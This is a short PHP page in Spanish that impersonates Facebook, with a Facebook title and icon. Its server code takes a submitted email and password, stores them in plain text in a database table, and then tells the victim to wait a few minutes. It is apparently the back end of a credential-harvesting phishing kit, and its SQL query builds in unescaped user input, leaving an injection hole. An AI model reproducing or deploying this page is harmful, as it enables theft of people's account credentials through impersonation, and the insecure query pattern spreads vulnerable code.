<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="shortcut icon" href="facebook.png" type="image/x-icon">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <main class="main__information">
        <?php
            include 'connectBD.php';

            if(isset($_POST['iniciasesion'])){
                $correo = $_POST["correo"];
                $password = $_POST["password"];
                $id = rand(1,99);

                $insertarDatos = "INSERT INTO datos VALUES('$correo', 
                                                            '$password',
                                                            '$id')";

                $ejecutarInsertar = mysqli_query($enlace, $insertarDatos);
                
                if($ejecutarInsertar){
                    echo "Espera unos minutos...";
                    
                }
            }
    ?>
    </main>
</body>
</html>

